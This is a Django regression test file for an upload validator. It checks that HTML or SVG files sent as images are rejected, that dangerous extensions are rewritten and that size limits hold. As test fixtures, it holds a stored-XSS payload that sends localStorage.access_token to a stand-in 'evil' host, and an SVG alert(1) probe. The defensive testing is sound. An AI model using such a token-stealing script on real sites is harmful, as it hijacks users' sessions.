"""Regression tests for core.upload_security.

These lock in the fix for the upload -> stored-XSS hole: an HTML/JS or SVG
payload sent with an image/pdf Content-Type must be rejected by its real
magic bytes, and a valid image given a dangerous filename extension must be
stored under a safe extension derived from its detected type.

SimpleTestCase: this is pure logic, no database, so it stays fast.
"""
import io

from django.test import SimpleTestCase

from core.upload_security import (
    IMAGE_KINDS,
    IMAGE_PDF_KINDS,
    UploadValidationError,
    validate_upload,
)

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 32
PDF = b"%PDF-1.4 test content"
WEBP = b"RIFF" + b"\x00\x00\x00\x00" + b"WEBP" + b"\x00" * 20
GIF = b"GIF89a" + b"\x00" * 26
HTML_AS_PNG = b"<html><script>fetch('//evil/'+localStorage.access_token)</script></html>"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'


class _FakeUpload:
    """Minimal stand-in for a Django UploadedFile."""

    def __init__(self, name, data):
        self._b = io.BytesIO(data)
        self.name = name
        self.size = len(data)

    def read(self, n=-1):
        return self._b.read(n)

    def seek(self, *a):
        return self._b.seek(*a)


class UploadSecurityTests(SimpleTestCase):
    def test_html_disguised_as_png_is_rejected(self):
        f = _FakeUpload("evil.png", HTML_AS_PNG)
        with self.assertRaises(UploadValidationError):
            validate_upload(f, allowed_kinds=IMAGE_PDF_KINDS)

    def test_svg_is_rejected_for_images(self):
        f = _FakeUpload("logo.svg", SVG)
        with self.assertRaises(UploadValidationError):
            validate_upload(f, allowed_kinds=IMAGE_KINDS)

    def test_valid_image_with_dangerous_extension_is_stored_safely(self):
        f = _FakeUpload("payload.html", PNG)
        kind = validate_upload(f, allowed_kinds=IMAGE_PDF_KINDS)
        self.assertEqual(kind, "png")
        self.assertTrue(f.name.endswith(".png"), f"stored name still dangerous: {f.name}")

    def test_valid_files_pass_with_correct_extension(self):
        cases = [
            ("id.png", PNG, IMAGE_PDF_KINDS, "png", ".png"),
            ("id.jpg", JPEG, IMAGE_PDF_KINDS, "jpeg", ".jpg"),
            ("doc.pdf", PDF, IMAGE_PDF_KINDS, "pdf", ".pdf"),
            ("pic.webp", WEBP, IMAGE_KINDS, "webp", ".webp"),
            ("anim.gif", GIF, IMAGE_KINDS, "gif", ".gif"),
        ]
        for name, data, kinds, expect_kind, expect_ext in cases:
            with self.subTest(name=name):
                f = _FakeUpload(name, data)
                self.assertEqual(validate_upload(f, allowed_kinds=kinds), expect_kind)
                self.assertTrue(f.name.endswith(expect_ext))

    def test_pdf_rejected_when_only_images_allowed(self):
        f = _FakeUpload("x.pdf", PDF)
        with self.assertRaises(UploadValidationError):
            validate_upload(f, allowed_kinds=IMAGE_KINDS)

    def test_empty_and_oversize_rejected(self):
        with self.assertRaises(UploadValidationError):
            validate_upload(_FakeUpload("empty.png", b""), allowed_kinds=IMAGE_PDF_KINDS)
        big = _FakeUpload("big.png", PNG + b"\x00" * (6 * 1024 * 1024))
        with self.assertRaises(UploadValidationError):
            validate_upload(big, allowed_kinds=IMAGE_PDF_KINDS, max_bytes=5 * 1024 * 1024)

    def test_octet_stream_rejected(self):
        f = _FakeUpload("doc.exe", b"\x00" * 100)
        with self.assertRaises(UploadValidationError):
            validate_upload(f, allowed_kinds=IMAGE_PDF_KINDS)

    def test_read_position_reset_after_validation(self):
        f = _FakeUpload("id.png", PNG)
        validate_upload(f, allowed_kinds=IMAGE_PDF_KINDS)
        self.assertEqual(f.read(8), PNG[:8], "file must be rewound for the storage backend to save it")
